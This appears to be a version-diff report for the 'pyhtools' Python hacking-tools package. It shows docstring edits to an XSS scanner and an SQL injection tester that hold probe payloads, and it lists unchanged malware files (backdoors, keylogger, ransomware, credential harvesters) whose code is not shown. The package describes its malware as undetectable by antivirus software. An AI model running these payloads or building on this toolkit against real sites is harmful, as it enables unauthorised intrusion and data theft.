+            value (str): Form input value to be used while filling form
+            url (str): base url of webpage
+
+        Returns: 
+            str: html contents of the reponse
         '''
         action = form.get('action')
         post_url = urljoin(url, action)
         # print(post_url)
 
         method = form.get('method')
         post_data_dict = {}
@@ -112,47 +134,58 @@
         else:
             post_response = self.session.get(url=url, params=post_data_dict)
         
         return self.remove_escape_seq(str(post_response.content))
         
     
     def is_xss_vulnerable_in_form(self, form, url)->bool:
-        '''
-        description: tests whether the passed form is xss vulnerable or not. 
-        returns True if vulnerable. 
-        params: form, url
-        returns: bool
+        '''tests whether the passed form is xss vulnerable or not. 
+        
+        Args:
+            form (dict): webpage form from bs4.element.ResultSet
+            url (str): base url of webpage
+
+        Returns: 
+            bool: returns True if vulnerable else False
         '''
         test_script_payload = "<scRipt>alert('vulnerable')</sCript>"
         response_content = self.submit_form(form, test_script_payload, url)
         # response = BeautifulSoup(response_content, 'html.parser')
         # print(BRIGHT_YELLOW + '[-] RESPONSE: \n', response.prettify())
         return test_script_payload in response_content
 
 
     def is_xss_vulnerable_in_link(self, url, payload=None):
-        '''
-        description: tests whether the passed url is xss vulnerable or not. 
-        returns True if vulnerable. 
-        params: form, url, payload
-        returns: bool
+        '''tests whether the passed url is xss vulnerable or not. 
+        
+        Args:
+            url (str): base url of webpage
+            payload (str): XSS payload to be injected in URL during test
+
+        Returns: 
+            bool: returns True if vulnerable else False
         '''
         if payload is None:
             payload = "<scRipt>alert('vulnerable')</sCript>"
         url = url.replace('=',f'={payload}')
         response_content = self.get_page_content(url)
         # response = BeautifulSoup(response_content, 'html.parser')
         # print(BRIGHT_YELLOW + '[-] RESPONSE: \n', response.prettify())
 
         return payload in response_content
 
 
     def run(self):
-        '''
-        Starts the scanner.
+        '''Starts the scanner
+
+        Args:
+            None
+
+        Returns: 
+            None
         '''
         try:
             try:
                 print(BRIGHT_WHITE + '[*] Spider is mapping website.')
                 print(BRIGHT_YELLOW + '[!] Press ctrl+c to stop mapping!')
                 self.get_target_links(self.target_url)
             except KeyboardInterrupt:
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/sqli.py` & `pyhtools-2.2.3/pyhtools/attackers/web/vuln_scanner/sqli.py`

 * *Files 8% similar despite different names*

```diff
@@ -6,49 +6,58 @@
 '''
 from argparse import ArgumentParser
 from requests import get
 from sys import exit
 
 
 def is_url_valid(url: str) -> bool:
-    '''
-    desc: checks if url is valid, returns True if url is valid else False
-    params: url (str): url of the target
-    returns: bool
+    '''checks if url is valid
+    
+    Args: 
+        url (str): url of the target
+    
+    Returns:
+        bool: returns True if url is valid else False
     '''
     is_valid = False
     if 'http://' in url or 'https://' in url:
         is_valid = True
 
     if len(url.split('?')[-1]) == 0:
         is_valid = False
 
     return is_valid
 
 
 def is_vulnerable(url: str) -> bool:
-    '''
-    desc: tests whether app is vulnerable to the url, returns True if vulnerable else returns False
-    params: url (str): url of the target
-    returns: bool
+    '''tests whether app is vulnerable to the url
+
+    Args: 
+        url (str): url of the target
+    
+    Returns: 
+        bool: returns True if vulnerable else returns False
     '''
     response = get(url=url)
     content = response.content.lower()
 
     if response.status_code not in (200, 404) or b'error' in content or b'on line' in content or b'at line' in content:
         return True
 
     return False
 
 
 def enumerate_tests(url):
-    '''
-    desc: tests application for various SQL injection methods
-    params: url (str): url of the target
-    returns: None
+    '''tests application for various SQL injection methods
+    
+    Args: 
+        url (str): url of the target
+    
+    Returns: 
+        None
     '''
     vuln_links = 0
     sqli_payloads = ["'", "'--",
                      "' UNION SELECT NULL--", "' UNION ORDER BY 1--"]
 
     for payload in sqli_payloads:
         payload_url = url + payload
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/vuln_scanner.py` & `pyhtools-2.2.3/pyhtools/attackers/web/vuln_scanner/__main__.py`

 * *Files 9% similar despite different names*

```diff
@@ -1,18 +1,22 @@
 import scanner
 import argparse
 from pyhtools.UI.colors import BRIGHT_RED, BRIGHT_YELLOW
 import sys
 
 
 def get_args():
-    '''
-    description: get arguments from the user.
-    params: None
-    returns: dictionary of arguments.
+    '''get arguments from the user and return as dict containing
+    target_url, ignore_links, login_link, and login_details
+    
+    Args:
+        None
+    
+    Returns:
+        dict: user arguments
     '''
     parser = argparse.ArgumentParser(description='Web Application Vulnerability Scanner')
     parser.add_argument('-t', '--target-url',dest='target_url',help='root url of the target website', required=True)
     parser.add_argument('-ig', '--ignore-links', dest='ignore_links', help='url of wepages which are to be ignored while scanning/testing for vulnerabilities separated by commas')
     parser.add_argument('-l','--login-link',dest='login_link',help='direct login/authentication link')
     parser.add_argument('-ld', '--login-details', dest='login_details', help='pass login details if authentication required as username,password (separated by comma)')
     args = parser.parse_args()
```

### Comparing `pyhtools-2.2.2/pyhtools/detectors/arp_spoof_detector.py` & `pyhtools-2.2.3/pyhtools/detectors/arp_spoof_detector.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/backdoor/ssh/backdoor.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/backdoor/ssh/backdoor.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/backdoor/ssh/handler.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/backdoor/ssh/handler.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/credential_harvester.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/data_harvesters/credential_harvester.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/ssh_cred_harvester.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/data_harvesters/ssh_cred_harvester.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/telegram_data_harvester.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/data_harvesters/telegram_data_harvester.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/data_harvesters/wireless_password_harvester.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/data_harvesters/wireless_password_harvester.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/installer/cert.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/installer/cert.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/keylogger/keylogger.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/keylogger/keylogger.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/backdoor.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/backdoor.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/listener.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/HTTP/listener.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/TCP/listener.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/TCP/listener.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/TCP/reverse_backdoor.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/TCP/reverse_backdoor.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/reverse_backdoor/ssh/backdoor.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/reverse_backdoor/ssh/backdoor.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/telegram_remote_code_executor/TelegramRemoteCodeExecutor.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/telegram_remote_code_executor/TelegramRemoteCodeExecutor.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/malwares/utils.py` & `pyhtools-2.2.3/pyhtools/evil_files/malwares/utils.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/ransomwares/dmsec/decrypter.py` & `pyhtools-2.2.3/pyhtools/evil_files/ransomwares/dmsec/decrypter.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/ransomwares/dmsec/encrypter.py` & `pyhtools-2.2.3/pyhtools/evil_files/ransomwares/dmsec/encrypter.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/evil_files/worms/dir_cloner.py` & `pyhtools-2.2.3/pyhtools/evil_files/worms/dir_cloner.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/utils.py` & `pyhtools-2.2.3/pyhtools/utils.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyproject.toml` & `pyhtools-2.2.3/pyproject.toml`

 * *Files 11% similar despite different names*

```diff
@@ -1,17 +1,17 @@
 [tool.poetry]
 name = "pyhtools"
-version = "2.2.2"
+version = "2.2.3"
 description = "Python Hacking Tools (PyHTools) (pht) is a collection of python written hacking tools consisting of network scanner, arp spoofer and detector, dns spoofer, code injector, packet sniffer, network jammer, email sender, downloader, wireless password harvester credential harvester, keylogger, download&execute, and reverse_backdoor along with website login bruteforce, scraper, web spider etc. PHT also includes malwares which are undetectable by the antiviruses."
 authors = ["Dhrumil Mistry <contact@dmdhrumilmistry.tech>"]
 license = "MIT"
 readme = "README.md"
 
 [tool.poetry.dependencies]
-python = "^3.10"
+python = ">=3.8,<4.0"
 aiodns = "^3.0.0"
 aiohttp = "^3.8.4"
 beautifulsoup4 = "^4.11.2"
 colorama = "^0.4.6"
 frida-tools = "^12.1.1"
 nuitka = "^1.4.8"
 paramiko = "^3.0.0"
@@ -22,19 +22,23 @@
 prettytable = "^3.6.0"
 psutil = "^5.9.4"
 requests = "^2.28.2"
 scapy = "^2.5.0"
 zstandard = "^0.20.0"
 netfilterqueue = {version = "^1.1.0", optional = true}
 wmi = {version = "^1.5.1", optional = true}
+mkdocs = {version = "^1.4.3", optional = true}
+mkdocstrings = {extras = ["python"], version = "^0.21.2", optional = true}
+mkdocs-material = {version = "^9.1.12", optional = true}
 
 
 [tool.poetry.extras]
 linux = ["netfilterqueue"]
 windows = ["wmi"]
+docs = ["mkdocs", "mkdocstrings", "mkdocs-material"]
 
 
 [tool.poetry.urls]
 "Home" = "https://github.com/dmdhrumilmistry/pyhtools"
 "Bug Tracker" = "https://github.com/dmdhrumilmistry/pyhtools/issues"
 "Support" = "https://github.com/sponsors/dmdhrumilmistry/"
 "PayPal" = "https://paypal.me/dmdhrumilmistry"
```

### Comparing `pyhtools-2.2.2/PKG-INFO` & `pyhtools-2.2.3/PKG-INFO`

 * *Files 3% similar despite different names*

```diff
@@ -1,32 +1,38 @@
 Metadata-Version: 2.1
 Name: pyhtools
-Version: 2.2.2
+Version: 2.2.3
 Summary: Python Hacking Tools (PyHTools) (pht) is a collection of python written hacking tools consisting of network scanner, arp spoofer and detector, dns spoofer, code injector, packet sniffer, network jammer, email sender, downloader, wireless password harvester credential harvester, keylogger, download&execute, and reverse_backdoor along with website login bruteforce, scraper, web spider etc. PHT also includes malwares which are undetectable by the antiviruses.
 License: MIT
 Author: Dhrumil Mistry
 Author-email: contact@dmdhrumilmistry.tech
-Requires-Python: >=3.10,<4.0
+Requires-Python: >=3.8,<4.0
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Programming Language :: Python :: 3.9
 Classifier: Programming Language :: Python :: 3.10
 Classifier: Programming Language :: Python :: 3.11
+Provides-Extra: docs
 Provides-Extra: linux
 Provides-Extra: windows
 Requires-Dist: aiodns (>=3.0.0,<4.0.0)
 Requires-Dist: aiohttp (>=3.8.4,<4.0.0)
 Requires-Dist: beautifulsoup4 (>=4.11.2,<5.0.0)
 Requires-Dist: colorama (>=0.4.6,<0.5.0)
 Requires-Dist: frida-tools (>=12.1.1,<13.0.0)
+Requires-Dist: mkdocs (>=1.4.3,<2.0.0) ; extra == "docs"
+Requires-Dist: mkdocs-material (>=9.1.12,<10.0.0) ; extra == "docs"
+Requires-Dist: mkdocstrings[python] (>=0.21.2,<0.22.0) ; extra == "docs"
 Requires-Dist: netfilterqueue (>=1.1.0,<2.0.0) ; extra == "linux"
 Requires-Dist: nuitka (>=1.4.8,<2.0.0)
 Requires-Dist: paramiko (>=3.0.0,<4.0.0)
 Requires-Dist: prettytable (>=3.6.0,<4.0.0)
 Requires-Dist: psutil (>=5.9.4,<6.0.0)
-Requires-Dist: pure-python-adb (>=0.3.0.dev0,<0.4.0)
+Requires-Dist: pure-python-adb (==0.3.*)
 Requires-Dist: pyfiglet (>=0.8.post1,<0.9)
 Requires-Dist: pynput (>=1.7.6,<2.0.0)
 Requires-Dist: pytelegrambotapi (>=4.10.0,<5.0.0)
 Requires-Dist: requests (>=2.28.2,<3.0.0)
 Requires-Dist: scapy (>=2.5.0,<3.0.0)
 Requires-Dist: wmi (>=1.5.1,<2.0.0) ; extra == "windows"
 Requires-Dist: zstandard (>=0.20.0,<0.21.0)
```

